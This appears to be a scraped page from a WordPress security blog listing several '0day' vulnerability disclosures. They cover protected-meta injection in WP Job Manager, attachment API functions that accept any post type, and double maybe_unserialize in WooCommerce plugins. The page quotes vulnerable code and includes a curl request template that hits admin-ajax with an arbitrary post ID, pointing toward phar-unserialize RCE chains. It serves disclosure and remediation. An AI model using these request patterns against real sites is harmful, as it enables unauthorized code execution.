							<svg class="svg-icon" aria-hidden="true" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" width="18" height="20" viewbox="0 0 18 20"><path fill="" d="M18,19 C18,19.5522847 17.5522847,20 17,20 C16.4477153,20 16,19.5522847 16,19 L16,17 C16,15.3431458 14.6568542,14 13,14 L5,14 C3.34314575,14 2,15.3431458 2,17 L2,19 C2,19.5522847 1.55228475,20 1,20 C0.44771525,20 0,19.5522847 0,19 L0,17 C0,14.2385763 2.23857625,12 5,12 L13,12 C15.7614237,12 18,14.2385763 18,17 L18,19 Z M9,10 C6.23857625,10 4,7.76142375 4,5 C4,2.23857625 6.23857625,0 9,0 C11.7614237,0 14,2.23857625 14,5 C14,7.76142375 11.7614237,10 9,10 Z M9,8 C10.6568542,8 12,6.65685425 12,5 C12,3.34314575 10.6568542,2 9,2 C7.34314575,2 6,3.34314575 6,5 C6,6.65685425 7.34314575,8 9,8 Z"></path></svg></span>
						<span class="meta-text">
							By <a href="https://wpdeeply.com/author/root/">root</a>						</span>
					</li>
										<li class="post-date meta-wrapper">
						<span class="meta-icon">
							<span class="screen-reader-text">Post date</span>
							<svg class="svg-icon" aria-hidden="true" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" width="18" height="19" viewbox="0 0 18 19"><path fill="" d="M4.60069444,4.09375 L3.25,4.09375 C2.47334957,4.09375 1.84375,4.72334957 1.84375,5.5 L1.84375,7.26736111 L16.15625,7.26736111 L16.15625,5.5 C16.15625,4.72334957 15.5266504,4.09375 14.75,4.09375 L13.3993056,4.09375 L13.3993056,4.55555556 C13.3993056,5.02154581 13.0215458,5.39930556 12.5555556,5.39930556 C12.0895653,5.39930556 11.7118056,5.02154581 11.7118056,4.55555556 L11.7118056,4.09375 L6.28819444,4.09375 L6.28819444,4.55555556 C6.28819444,5.02154581 5.9104347,5.39930556 5.44444444,5.39930556 C4.97845419,5.39930556 4.60069444,5.02154581 4.60069444,4.55555556 L4.60069444,4.09375 Z M6.28819444,2.40625 L11.7118056,2.40625 L11.7118056,1 C11.7118056,0.534009742 12.0895653,0.15625 12.5555556,0.15625 C13.0215458,0.15625 13.3993056,0.534009742 13.3993056,1 L13.3993056,2.40625 L14.75,2.40625 C16.4586309,2.40625 17.84375,3.79136906 17.84375,5.5 L17.84375,15.875 C17.84375,17.5836309 16.4586309,18.96875 14.75,18.96875 L3.25,18.96875 C1.54136906,18.96875 0.15625,17.5836309 0.15625,15.875 L0.15625,5.5 C0.15625,3.79136906 1.54136906,2.40625 3.25,2.40625 L4.60069444,2.40625 L4.60069444,1 C4.60069444,0.534009742 4.97845419,0.15625 5.44444444,0.15625 C5.9104347,0.15625 6.28819444,0.534009742 6.28819444,1 L6.28819444,2.40625 Z M1.84375,8.95486111 L1.84375,15.875 C1.84375,16.6516504 2.47334957,17.28125 3.25,17.28125 L14.75,17.28125 C15.5266504,17.28125 16.15625,16.6516504 16.15625,15.875 L16.15625,8.95486111 L1.84375,8.95486111 Z"></path></svg></span>
						<span class="meta-text">
							<a href="https://wpdeeply.com/wordpress-protected-meta-via-wp-job-manager/">August 11, 2020</a>
						</span>
					</li>
					
			</ul></div>

		
	</div>

</header><div class="post-inner thin ">

		<div class="entry-content">

			
<p>Adding slashes or removing them is a thing on WP. Most of the meta functions perform that e.g. they hold that not popularÂ <code>wp_unslash</code>against meta keys and values. This means when input towardsÂ <code>update_metadata</code>Â andÂ <code>add_metadata</code>Â isnâ€™t from the current http requst via some web form e.g. html interface there is possibility for user to insert/update protected meta key into post meta database table with simpleÂ <code>\_any-value</code>Â meta key format.</p>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-protected-meta-job-manager.md#eli5-poc"></a>Eli5 PoC</h2>



<p>WP Job Manager holds functionality that duplicates Job Post and that is avaliable only via Job Dashboard. That is possible viaÂ <code>job_manager_duplicate_listing</code>Â function and there we have theÂ <code>update_post_meta</code>Â call.</p>



<pre class="wp-block-code"><code lang="php" class="language-php">...
	// phpcs:ignore WordPress.DB.DirectDatabaseQuery.DirectQuery, WordPress.DB.DirectDatabaseQuery.NoCaching -- Easiest way to retrieve raw meta values without filters.
	$post_meta = $wpdb->get_results( $wpdb->prepare( "SELECT meta_key, meta_value FROM {$wpdb->postmeta} WHERE post_id=%d", $post_id ) );

	if ( ! empty( $post_meta ) ) {
		$post_meta = wp_list_pluck( $post_meta, 'meta_value', 'meta_key' );

		$default_duplicate_ignore_keys = [ '_filled', '_featured', '_job_expires', '_job_duration', '_package_id', '_user_package_id' ];
		$duplicate_ignore_keys         = apply_filters( 'job_manager_duplicate_listing_ignore_keys', $default_duplicate_ignore_keys, true );

		foreach ( $post_meta as $meta_key => $meta_value ) {
			if ( in_array( $meta_key, $duplicate_ignore_keys, true ) ) {
				continue;
			}
			update_post_meta( $new_post_id, $meta_key, maybe_unserialize( $meta_value ) );
		}
	}
...
</code></pre>



<p>Everything is fine, but we must have the possibility to insert meta / custom fields into job post. If we check deeply this functionality then thisÂ <code>job_manager_duplicate_listing</code>Â is called inÂ <code>job_dashboard_handler</code>Â which isÂ <code>WP_Job_Manager_Shortcodes</code>Â method. Checking its functionlity we have the following:</p>



<pre class="wp-block-code"><code lang="php" class="language-php">public function job_dashboard_handler() {
	if (
		! empty( $_REQUEST['action'] )
		&& ! empty( $_REQUEST['_wpnonce'] )
		&& wp_verify_nonce( wp_unslash( $_REQUEST['_wpnonce'] ), 'job_manager_my_job_actions' ) // phpcs:ignore WordPress.Security.ValidatedSanitizedInput.InputNotSanitized -- Nonce should not be modified.
	) {

		$action = sanitize_title( wp_unslash( $_REQUEST['action'] ) );
		$job_id = isset( $_REQUEST['job_id'] ) ? absint( $_REQUEST['job_id'] ) : 0;

		try {
			// Get Job.
			$job = get_post( $job_id );

			// Check ownership.
			if ( ! job_manager_user_can_edit_job( $job_id ) ) {
				throw new Exception( __( 'Invalid ID', 'wp-job-manager' ) );
			}

			switch ( $action ) {
...
case 'duplicate':
						if ( ! job_manager_get_permalink( 'submit_job_form' ) ) {
							throw new Exception( __( 'Missing submission page.', 'wp-job-manager' ) );
						}

						$new_job_id = job_manager_duplicate_listing( $job_id );

</code></pre>



<p>From here we see thatÂ <code>_wpnonce</code>Â isnâ€™t tight up with job id, but also fromÂ <code>job_manager_user_can_edit_job</code>Â we see that post type isnâ€™t checked, but only capability for user to edit the post and that could be any post from any post type. Having in mind previous knowledge presented on wpdeeply and nature of WordPress, this could be considered as high severity issue. Check the facts for RCE ğŸ™‚</p>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-protected-meta-job-manager.md#few-facts"></a>Few facts</h2>



<ul><li>WP Job Manager <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-attachment-api-functions-and-any-post-type/" target="_blank">isnâ€™t alone</a> and can be attacked via core</li><li>What about WooCommerce before 4.1.0 or <a href="https://wpdeeply.com/woocommerce-mysql-replace-to-rce/" target="_blank" rel="noreferrer noopener">latest WooCommerce</a></li><li>Accessing the blocked meta keys inÂ <code>job_manager_duplicate_listing</code>Â via this <a href="https://wpdeeply.com/wordpress-core-and-mysql-string-comparison/" target="_blank" rel="noreferrer noopener">technique</a></li></ul><h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-protected-meta-job-manager.md#remediation"></a>Remediation</h2>



<ul><li>CallingÂ <code>wp_slash</code>Â on input wonâ€™t solve the issue, because <code>update_metadata</code></li><li>:/</li></ul></div>

	</div>

	<div class="section-inner">
		
		<div class="post-meta-wrapper post-meta-single post-meta-single-bottom">

			<ul class="post-meta"><li class="post-tags meta-wrapper">
						<span class="meta-icon">
							<span class="screen-reader-text">Tags</span>
							<svg class="svg-icon" aria-hidden="true" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewbox="0 0 18 18"><path fill="" d="M15.4496399,8.42490555 L8.66109799,1.63636364 L1.63636364,1.63636364 L1.63636364,8.66081885 L8.42522727,15.44178 C8.57869221,15.5954158 8.78693789,15.6817418 9.00409091,15.6817418 C9.22124393,15.6817418 9.42948961,15.5954158 9.58327627,15.4414581 L15.4486339,9.57610048 C15.7651495,9.25692435 15.7649133,8.74206554 15.4496399,8.42490555 Z M16.6084423,10.7304545 L10.7406818,16.59822 C10.280287,17.0591273 9.65554997,17.3181054 9.00409091,17.3181054 C8.35263185,17.3181054 7.72789481,17.0591273 7.26815877,16.5988788 L0.239976954,9.57887876 C0.0863319284,9.4254126 0,9.21716044 0,9 L0,0.818181818 C0,0.366312477 0.366312477,0 0.818181818,0 L9,0 C9.21699531,0 9.42510306,0.0862010512 9.57854191,0.239639906 L16.6084423,7.26954545 C17.5601275,8.22691012 17.5601275,9.77308988 16.6084423,10.7304545 Z M5,6 C4.44771525,6 4,5.55228475 4,5 C4,4.44771525 4.44771525,4 5,4 C5.55228475,4 6,4.44771525 6,5 C6,5.55228475 5.55228475,6 5,6 Z"></path></svg></span>
						<span class="meta-text">
							<a href="https://wpdeeply.com/tag/0day/" rel="tag">0day</a>						</span>
					</li>
					
			</ul></div>

		
	</div>

	
</article><hr class="post-separator styled-separator is-style-wide section-inner" aria-hidden="true"><article class="post-197 post type-post status-publish format-standard hentry category-core category-plugins tag-0day" id="post-197"><header class="entry-header has-text-align-center"><div class="entry-header-inner section-inner medium">

		
			<div class="entry-categories">
				<span class="screen-reader-text">Categories</span>
				<div class="entry-categories-inner">
					<a href="https://wpdeeply.com/category/core/" rel="category tag">core</a> <a href="https://wpdeeply.com/category/plugins/" rel="category tag">plugins</a>				</div>
			</div>

			<h2 class="entry-title heading-size-1"><a href="https://wpdeeply.com/wordpress-attachment-api-functions-and-any-post-type/">WordPress attachment api functions and any post type</a></h2>
		<div class="post-meta-wrapper post-meta-single post-meta-single-top">

			<ul class="post-meta"><li class="post-author meta-wrapper">
						<span class="meta-icon">
							<span class="screen-reader-text">Post author</span>
							<svg class="svg-icon" aria-hidden="true" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" width="18" height="20" viewbox="0 0 18 20"><path fill="" d="M18,19 C18,19.5522847 17.5522847,20 17,20 C16.4477153,20 16,19.5522847 16,19 L16,17 C16,15.3431458 14.6568542,14 13,14 L5,14 C3.34314575,14 2,15.3431458 2,17 L2,19 C2,19.5522847 1.55228475,20 1,20 C0.44771525,20 0,19.5522847 0,19 L0,17 C0,14.2385763 2.23857625,12 5,12 L13,12 C15.7614237,12 18,14.2385763 18,17 L18,19 Z M9,10 C6.23857625,10 4,7.76142375 4,5 C4,2.23857625 6.23857625,0 9,0 C11.7614237,0 14,2.23857625 14,5 C14,7.76142375 11.7614237,10 9,10 Z M9,8 C10.6568542,8 12,6.65685425 12,5 C12,3.34314575 10.6568542,2 9,2 C7.34314575,2 6,3.34314575 6,5 C6,6.65685425 7.34314575,8 9,8 Z"></path></svg></span>
						<span class="meta-text">
							By <a href="https://wpdeeply.com/author/root/">root</a>						</span>
					</li>
										<li class="post-date meta-wrapper">
						<span class="meta-icon">
							<span class="screen-reader-text">Post date</span>
							<svg class="svg-icon" aria-hidden="true" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" width="18" height="19" viewbox="0 0 18 19"><path fill="" d="M4.60069444,4.09375 L3.25,4.09375 C2.47334957,4.09375 1.84375,4.72334957 1.84375,5.5 L1.84375,7.26736111 L16.15625,7.26736111 L16.15625,5.5 C16.15625,4.72334957 15.5266504,4.09375 14.75,4.09375 L13.3993056,4.09375 L13.3993056,4.55555556 C13.3993056,5.02154581 13.0215458,5.39930556 12.5555556,5.39930556 C12.0895653,5.39930556 11.7118056,5.02154581 11.7118056,4.55555556 L11.7118056,4.09375 L6.28819444,4.09375 L6.28819444,4.55555556 C6.28819444,5.02154581 5.9104347,5.39930556 5.44444444,5.39930556 C4.97845419,5.39930556 4.60069444,5.02154581 4.60069444,4.55555556 L4.60069444,4.09375 Z M6.28819444,2.40625 L11.7118056,2.40625 L11.7118056,1 C11.7118056,0.534009742 12.0895653,0.15625 12.5555556,0.15625 C13.0215458,0.15625 13.3993056,0.534009742 13.3993056,1 L13.3993056,2.40625 L14.75,2.40625 C16.4586309,2.40625 17.84375,3.79136906 17.84375,5.5 L17.84375,15.875 C17.84375,17.5836309 16.4586309,18.96875 14.75,18.96875 L3.25,18.96875 C1.54136906,18.96875 0.15625,17.5836309 0.15625,15.875 L0.15625,5.5 C0.15625,3.79136906 1.54136906,2.40625 3.25,2.40625 L4.60069444,2.40625 L4.60069444,1 C4.60069444,0.534009742 4.97845419,0.15625 5.44444444,0.15625 C5.9104347,0.15625 6.28819444,0.534009742 6.28819444,1 L6.28819444,2.40625 Z M1.84375,8.95486111 L1.84375,15.875 C1.84375,16.6516504 2.47334957,17.28125 3.25,17.28125 L14.75,17.28125 C15.5266504,17.28125 16.15625,16.6516504 16.15625,15.875 L16.15625,8.95486111 L1.84375,8.95486111 Z"></path></svg></span>
						<span class="meta-text">
							<a href="https://wpdeeply.com/wordpress-attachment-api-functions-and-any-post-type/">August 9, 2020</a>
						</span>
					</li>
					
			</ul></div>

		
	</div>

</header><div class="post-inner thin ">

		<div class="entry-content">

			
<p>Core had put some efforts in order to prevent accessingÂ <code>attachment</code>Â post type functions from another post types. Usually checks are done by callingÂ <code>get_post</code>Â and comparing the post type withÂ <code>attachment</code>, but that is selective and only in hand picked places. It is that way because performances mainly, so many functions are lacking this checks.</p>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-attachment-api-any.md#eli5-poc"></a>Eli5 PoC</h2>



<p>One of them, that calls another attachment related isÂ <code>wp_update_image_subsizes</code>Â and there we have the following calls up toÂ <code>path_join</code>where we have <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-and-phar-unserialize/" target="_blank">phar unserialize</a> orÂ <code>wp_create_image_subsizes</code>Â where <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-null-byte-to-rce-0-day-bug/" target="_blank">image editor RCE ?!</a> is in game, but alsoÂ <code>getimagesize</code>Â as phar unserialize appears too.</p>



<ul><li><code>wp_update_image_subsizes</code><ul><li><code>wp_get_attachment_metadata</code></li><li><code>wp_get_original_image_path</code><ul><li><code>wp_attachment_is_image</code></li><li><code>wp_get_attachment_metadata</code></li><li><code>get_attached_file</code></li><li><code>path_join</code></li></ul></li></ul></li></ul><p>this function is called inÂ <code>wp_ajax_media_create_image_subsizes</code></p>



<pre class="wp-block-code"><code lang="php" class="language-php">function wp_ajax_media_create_image_subsizes() {
	check_ajax_referer( 'media-form' );

	if ( ! current_user_can( 'upload_files' ) ) {
		wp_send_json_error( array( 'message' => __( 'Sorry, you are not allowed to upload files.' ) ) );
	}

	if ( empty( $_POST['attachment_id'] ) ) {
		wp_send_json_error( array( 'message' => __( 'Upload failed. Please reload and try again.' ) ) );
	}

	$attachment_id = (int) $_POST['attachment_id'];

	if ( ! empty( $_POST['_wp_upload_failed_cleanup'] ) ) {
		// Upload failed. Cleanup.
		if ( wp_attachment_is_image( $attachment_id ) && current_user_can( 'delete_post', $attachment_id ) ) {
			$attachment = get_post( $attachment_id );

			// Created at most 10 min ago.
			if ( $attachment && ( time() - strtotime( $attachment->post_date_gmt ) < 600 ) ) {
				wp_delete_attachment( $attachment_id, true );
				wp_send_json_success();
			}
		}
	}

	// Set a custom header with the attachment_id.
	// Used by the browser/client to resume creating image sub-sizes after a PHP fatal error.
	if ( ! headers_sent() ) {
		header( 'X-WP-Upload-Attachment-ID: ' . $attachment_id );
	}

	// This can still be pretty slow and cause timeout or out of memory errors.
	// The js that handles the response would need to also handle HTTP 500 errors.
	wp_update_image_subsizes( $attachment_id );
...
</code></pre>



<p>whereÂ <code>attachment_id</code>Â could be any postÂ <code>ID</code>Â from anyÂ <code>post_type</code>. So ifÂ <code>author</code>Â user role grabs theÂ <code>_wpnonce</code>Â fromÂ <code>wp-admin/media-new.php</code>Â could perform the request below with â€œattackingâ€ post ID.</p>



<pre class="wp-block-code"><code lang="bash" class="language-bash">curl 'http://local.target/wp-admin/admin-ajax.php' -H 'Cookie: ...' --data 'action=media-create-image-subsizes&_ajax_nonce=[media-form-nonce]&attachment_id=[any-post-id-with-protected-atachment-meta]' --compressed
</code></pre>



<p>How to add protected meta into posts?! Check the facts below. ğŸ™‚</p>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-attachment-api-any.md#few-facts"></a>Few facts</h2>



<ul><li>Yoast Duplicate posts is <a href="https://plugins.trac.wordpress.org/browser/duplicate-post/trunk/duplicate-post-admin.php#L637" target="_blank" rel="noreferrer noopener">adding protected</a> meta when cloning if meta / custom field key starts withÂ <code>\_</code></li><li>We had already seen the <a href="https://wpdeeply.com/wordpress-importer-arbitrary-post-create/" target="_blank" rel="noreferrer noopener">wordpress-importer in action</a></li><li>WooCommerce had fixed something similar <a rel="noreferrer noopener" href="https://raw.githubusercontent.com/woocommerce/woocommerce/master/CHANGELOG.txt" target="_blank">few months</a> ago in 4.1.0 version</li></ul><h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-attachment-api-any.md#remediation"></a>Remediation</h2>



<ul><li>make sure thatÂ <code>attachment</code>Â routines are performed only over attachments</li><li>do not allow users to create protected meta</li></ul></div>

	</div>

	<div class="section-inner">
		
		<div class="post-meta-wrapper post-meta-single post-meta-single-bottom">

			<ul class="post-meta"><li class="post-tags meta-wrapper">
						<span class="meta-icon">
							<span class="screen-reader-text">Tags</span>
							<svg class="svg-icon" aria-hidden="true" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewbox="0 0 18 18"><path fill="" d="M15.4496399,8.42490555 L8.66109799,1.63636364 L1.63636364,1.63636364 L1.63636364,8.66081885 L8.42522727,15.44178 C8.57869221,15.5954158 8.78693789,15.6817418 9.00409091,15.6817418 C9.22124393,15.6817418 9.42948961,15.5954158 9.58327627,15.4414581 L15.4486339,9.57610048 C15.7651495,9.25692435 15.7649133,8.74206554 15.4496399,8.42490555 Z M16.6084423,10.7304545 L10.7406818,16.59822 C10.280287,17.0591273 9.65554997,17.3181054 9.00409091,17.3181054 C8.35263185,17.3181054 7.72789481,17.0591273 7.26815877,16.5988788 L0.239976954,9.57887876 C0.0863319284,9.4254126 0,9.21716044 0,9 L0,0.818181818 C0,0.366312477 0.366312477,0 0.818181818,0 L9,0 C9.21699531,0 9.42510306,0.0862010512 9.57854191,0.239639906 L16.6084423,7.26954545 C17.5601275,8.22691012 17.5601275,9.77308988 16.6084423,10.7304545 Z M5,6 C4.44771525,6 4,5.55228475 4,5 C4,4.44771525 4.44771525,4 5,4 C5.55228475,4 6,4.44771525 6,5 C6,5.55228475 5.55228475,6 5,6 Z"></path></svg></span>
						<span class="meta-text">
							<a href="https://wpdeeply.com/tag/0day/" rel="tag">0day</a>						</span>
					</li>
					
			</ul></div>

		
	</div>

	
</article><hr class="post-separator styled-separator is-style-wide section-inner" aria-hidden="true"><article class="post-185 post type-post status-publish format-standard hentry category-plugins tag-0day" id="post-185"><header class="entry-header has-text-align-center"><div class="entry-header-inner section-inner medium">

		
			<div class="entry-categories">
				<span class="screen-reader-text">Categories</span>
				<div class="entry-categories-inner">
					<a href="https://wpdeeply.com/category/plugins/" rel="category tag">plugins</a>				</div>
			</div>

			<h2 class="entry-title heading-size-1"><a href="https://wpdeeply.com/wordpress-and-multiple-maybe_unserialize/">WordPress and multiple maybe_unserialize</a></h2>
		<div class="post-meta-wrapper post-meta-single post-meta-single-top">

			<ul class="post-meta"><li class="post-author meta-wrapper">
						<span class="meta-icon">
							<span class="screen-reader-text">Post author</span>
							<svg class="svg-icon" aria-hidden="true" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" width="18" height="20" viewbox="0 0 18 20"><path fill="" d="M18,19 C18,19.5522847 17.5522847,20 17,20 C16.4477153,20 16,19.5522847 16,19 L16,17 C16,15.3431458 14.6568542,14 13,14 L5,14 C3.34314575,14 2,15.3431458 2,17 L2,19 C2,19.5522847 1.55228475,20 1,20 C0.44771525,20 0,19.5522847 0,19 L0,17 C0,14.2385763 2.23857625,12 5,12 L13,12 C15.7614237,12 18,14.2385763 18,17 L18,19 Z M9,10 C6.23857625,10 4,7.76142375 4,5 C4,2.23857625 6.23857625,0 9,0 C11.7614237,0 14,2.23857625 14,5 C14,7.76142375 11.7614237,10 9,10 Z M9,8 C10.6568542,8 12,6.65685425 12,5 C12,3.34314575 10.6568542,2 9,2 C7.34314575,2 6,3.34314575 6,5 C6,6.65685425 7.34314575,8 9,8 Z"></path></svg></span>
						<span class="meta-text">
							By <a href="https://wpdeeply.com/author/root/">root</a>						</span>
					</li>
										<li class="post-date meta-wrapper">
						<span class="meta-icon">
							<span class="screen-reader-text">Post date</span>
							<svg class="svg-icon" aria-hidden="true" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" width="18" height="19" viewbox="0 0 18 19"><path fill="" d="M4.60069444,4.09375 L3.25,4.09375 C2.47334957,4.09375 1.84375,4.72334957 1.84375,5.5 L1.84375,7.26736111 L16.15625,7.26736111 L16.15625,5.5 C16.15625,4.72334957 15.5266504,4.09375 14.75,4.09375 L13.3993056,4.09375 L13.3993056,4.55555556 C13.3993056,5.02154581 13.0215458,5.39930556 12.5555556,5.39930556 C12.0895653,5.39930556 11.7118056,5.02154581 11.7118056,4.55555556 L11.7118056,4.09375 L6.28819444,4.09375 L6.28819444,4.55555556 C6.28819444,5.02154581 5.9104347,5.39930556 5.44444444,5.39930556 C4.97845419,5.39930556 4.60069444,5.02154581 4.60069444,4.55555556 L4.60069444,4.09375 Z M6.28819444,2.40625 L11.7118056,2.40625 L11.7118056,1 C11.7118056,0.534009742 12.0895653,0.15625 12.5555556,0.15625 C13.0215458,0.15625 13.3993056,0.534009742 13.3993056,1 L13.3993056,2.40625 L14.75,2.40625 C16.4586309,2.40625 17.84375,3.79136906 17.84375,5.5 L17.84375,15.875 C17.84375,17.5836309 16.4586309,18.96875 14.75,18.96875 L3.25,18.96875 C1.54136906,18.96875 0.15625,17.5836309 0.15625,15.875 L0.15625,5.5 C0.15625,3.79136906 1.54136906,2.40625 3.25,2.40625 L4.60069444,2.40625 L4.60069444,1 C4.60069444,0.534009742 4.97845419,0.15625 5.44444444,0.15625 C5.9104347,0.15625 6.28819444,0.534009742 6.28819444,1 L6.28819444,2.40625 Z M1.84375,8.95486111 L1.84375,15.875 C1.84375,16.6516504 2.47334957,17.28125 3.25,17.28125 L14.75,17.28125 C15.5266504,17.28125 16.15625,16.6516504 16.15625,15.875 L16.15625,8.95486111 L1.84375,8.95486111 Z"></path></svg></span>
						<span class="meta-text">
							<a href="https://wpdeeply.com/wordpress-and-multiple-maybe_unserialize/">July 27, 2020</a>
						</span>
					</li>
					
			</ul></div>

		
	</div>

</header><div class="post-inner thin ">

		<div class="entry-content">

			
<p>WordPress introducedÂ <code>maybe_unserialize</code>Â andÂ <code>maybe_serialize</code>Â as security functions in the past and they are deeply integrated in the core. Usually for backward compatibility or improper usage in the past, many software vendors are using multipleÂ <code>maybe_unserialize</code> towards values that could be planted into DB with lower number ofÂ <code>maybe_serialize</code>calls.</p>



<h2>Eli5 PoC</h2>



<pre class="wp-block-code"><code lang="php" class="language-php">$maybe_double_unserialize = function ( $value ) {
	return maybe_unserialize( $value );
};

$values = array_map(
	$maybe_double_unserialize,
	array_filter( get_post_meta( $product_id, $field_key ) )
);
</code></pre>



<p>and if you think that this code isnâ€™t existing then <a rel="noreferrer noopener" href="https://plugins.trac.wordpress.org/browser/woocommerce-multilingual/trunk/inc/translation-editor/class-wcml-editor-ui-product-job.php#L984" target="_blank">check this</a> out. Yes it is 100k active installs Woo plugin and when Woo unserialze attack is in question, <a rel="noreferrer noopener" href="https://wpdeeply.com/woocommerce-mysql-replace-to-rce/" target="_blank">then</a>! :/</p>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-multiple-maybe-unserialize.md#few-facts"></a>Few facts</h2>



<ul><li>doubleÂ <code>maybe_unserialize</code>Â is quite widespread around WP eco system, specially in Woo related plugins</li></ul><h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-multiple-maybe-unserialize.md#remadiation"></a>Remediation</h2>



<ul><li>add constraints into your php.ini regarding serialization</li><li>mod the maybe_ functions so they sign the final payload</li></ul></div>

	</div>

	<div class="section-inner">
		
		<div class="post-meta-wrapper post-meta-single post-meta-single-bottom">

			<ul class="post-meta"><li class="post-tags meta-wrapper">
						<span class="meta-icon">
							<span class="screen-reader-text">Tags</span>
							<svg class="svg-icon" aria-hidden="true" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewbox="0 0 18 18"><path fill="" d="M15.4496399,8.42490555 L8.66109799,1.63636364 L1.63636364,1.63636364 L1.63636364,8.66081885 L8.42522727,15.44178 C8.57869221,15.5954158 8.78693789,15.6817418 9.00409091,15.6817418 C9.22124393,15.6817418 9.42948961,15.5954158 9.58327627,15.4414581 L15.4486339,9.57610048 C15.7651495,9.25692435 15.7649133,8.74206554 15.4496399,8.42490555 Z M16.6084423,10.7304545 L10.7406818,16.59822 C10.280287,17.0591273 9.65554997,17.3181054 9.00409091,17.3181054 C8.35263185,17.3181054 7.72789481,17.0591273 7.26815877,16.5988788 L0.239976954,9.57887876 C0.0863319284,9.4254126 0,9.21716044 0,9 L0,0.818181818 C0,0.366312477 0.366312477,0 0.818181818,0 L9,0 C9.21699531,0 9.42510306,0.0862010512 9.57854191,0.239639906 L16.6084423,7.26954545 C17.5601275,8.22691012 17.5601275,9.77308988 16.6084423,10.7304545 Z M5,6 C4.44771525,6 4,5.55228475 4,5 C4,4.44771525 4.44771525,4 5,4 C5.55228475,4 6,4.44771525 6,5 C6,5.55228475 5.55228475,6 5,6 Z"></path></svg></span>
						<span class="meta-text">
							<a href="https://wpdeeply.com/tag/0day/" rel="tag">0day</a>						</span>
					</li>
					
			</ul></div>

		
	</div>

	
</article><hr class="post-separator styled-separator is-style-wide section-inner" aria-hidden="true"><article class="post-178 post type-post status-publish format-standard hentry category-core category-plugins tag-0day" id="post-178"><header class="entry-header has-text-align-center"><div class="entry-header-inner section-inner medium">

		
			<div class="entry-categories">
				<span class="screen-reader-text">Categories</span>
				<div class="entry-categories-inner">
					<a href="https://wpdeeply.com/category/core/" rel="category tag">core</a> <a href="https://wpdeeply.com/category/plugins/" rel="category tag">plugins</a>				</div>
			</div>

			<h2 class="entry-title heading-size-1"><a href="https://wpdeeply.com/wordpress-core-and-mysql-string-comparison/">WordPress core and MySQL string comparison</a></h2>
		<div class="post-meta-wrapper post-meta-single post-meta-single-top">

			<ul class="post-meta"><li class="post-author meta-wrapper">
						<span class="meta-icon">
							<span class="screen-reader-text">Post author</span>
							<svg class="svg-icon" aria-hidden="true" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" width="18" height="20" viewbox="0 0 18 20"><path fill="" d="M18,19 C18,19.5522847 17.5522847,20 17,20 C16.4477153,20 16,19.5522847 16,19 L16,17 C16,15.3431458 14.6568542,14 13,14 L5,14 C3.34314575,14 2,15.3431458 2,17 L2,19 C2,19.5522847 1.55228475,20 1,20 C0.44771525,20 0,19.5522847 0,19 L0,17 C0,14.2385763 2.23857625,12 5,12 L13,12 C15.7614237,12 18,14.2385763 18,17 L18,19 Z M9,10 C6.23857625,10 4,7.76142375 4,5 C4,2.23857625 6.23857625,0 9,0 C11.7614237,0 14,2.23857625 14,5 C14,7.76142375 11.7614237,10 9,10 Z M9,8 C10.6568542,8 12,6.65685425 12,5 C12,3.34314575 10.6568542,2 9,2 C7.34314575,2 6,3.34314575 6,5 C6,6.65685425 7.34314575,8 9,8 Z"></path></svg></span>
						<span class="meta-text">
							By <a href="https://wpdeeply.com/author/root/">root</a>						</span>
					</li>
										<li class="post-date meta-wrapper">
						<span class="meta-icon">
							<span class="screen-reader-text">Post date</span>
							<svg class="svg-icon" aria-hidden="true" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" width="18" height="19" viewbox="0 0 18 19"><path fill="" d="M4.60069444,4.09375 L3.25,4.09375 C2.47334957,4.09375 1.84375,4.72334957 1.84375,5.5 L1.84375,7.26736111 L16.15625,7.26736111 L16.15625,5.5 C16.15625,4.72334957 15.5266504,4.09375 14.75,4.09375 L13.3993056,4.09375 L13.3993056,4.55555556 C13.3993056,5.02154581 13.0215458,5.39930556 12.5555556,5.39930556 C12.0895653,5.39930556 11.7118056,5.02154581 11.7118056,4.55555556 L11.7118056,4.09375 L6.28819444,4.09375 L6.28819444,4.55555556 C6.28819444,5.02154581 5.9104347,5.39930556 5.44444444,5.39930556 C4.97845419,5.39930556 4.60069444,5.02154581 4.60069444,4.55555556 L4.60069444,4.09375 Z M6.28819444,2.40625 L11.7118056,2.40625 L11.7118056,1 C11.7118056,0.534009742 12.0895653,0.15625 12.5555556,0.15625 C13.0215458,0.15625 13.3993056,0.534009742 13.3993056,1 L13.3993056,2.40625 L14.75,2.40625 C16.4586309,2.40625 17.84375,3.79136906 17.84375,5.5 L17.84375,15.875 C17.84375,17.5836309 16.4586309,18.96875 14.75,18.96875 L3.25,18.96875 C1.54136906,18.96875 0.15625,17.5836309 0.15625,15.875 L0.15625,5.5 C0.15625,3.79136906 1.54136906,2.40625 3.25,2.40625 L4.60069444,2.40625 L4.60069444,1 C4.60069444,0.534009742 4.97845419,0.15625 5.44444444,0.15625 C5.9104347,0.15625 6.28819444,0.534009742 6.28819444,1 L6.28819444,2.40625 Z M1.84375,8.95486111 L1.84375,15.875 C1.84375,16.6516504 2.47334957,17.28125 3.25,17.28125 L14.75,17.28125 C15.5266504,17.28125 16.15625,16.6516504 16.15625,15.875 L16.15625,8.95486111 L1.84375,8.95486111 Z"></path></svg></span>
						<span class="meta-text">
